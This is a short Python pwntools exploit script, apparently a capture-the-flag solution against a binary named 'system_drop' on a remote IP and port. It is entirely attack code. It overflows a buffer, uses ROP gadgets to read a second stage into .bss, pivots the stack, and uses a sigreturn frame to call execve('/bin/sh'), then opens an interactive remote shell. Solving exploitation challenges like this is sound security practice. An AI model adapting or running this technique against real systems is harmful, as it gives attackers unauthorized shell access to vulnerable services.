#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('system_drop')
# p = process(elf.path)
# gdb.attach(p, 'init-gef')
p = remote("139.59.185.150", 32076)

pop_rdi = 0x00000000004005d3
pop_rsi_r15 = 0x00000000004005d1
pop_rsp_r13_r14_r15 = 0x00000000004005cd
syscall = 0x000000000040053b

data_location = elf.bss(0x40) - 8

offset_data = "A" * 40
payload = offset_data + flat(
    pop_rdi, 0,
    pop_rsi_r15, data_location, 0,
    elf.plt['read'],
    # stack pivot since I need more space for SigreturnFrame
    pop_rsp_r13_r14_r15, 
    # i dont care what it puts in r13, r14, r15
    data_location - (8 * 3)
)


sigreturn_num = 15

frame = SigreturnFrame(kernel='amd64')
frame.rdi = data_location + 0x200
frame.rsi = 0
frame.rdx = 0
frame.rax = 59 # sys_execve
frame.rip = 0x00400537
frame.rsp = data_location + 0x100


p.send(payload.ljust(0x100, 'A'))

payload2 = flat(
    pop_rdi, 0,
    pop_rsi_r15, data_location + 0x200, 0,
    elf.plt['read'],
    syscall
)
payload2 += str(frame)

p.send(payload2[:256])

p.send("/bin/sh\x00".ljust(sigreturn_num, 'A'))

p.interactive()
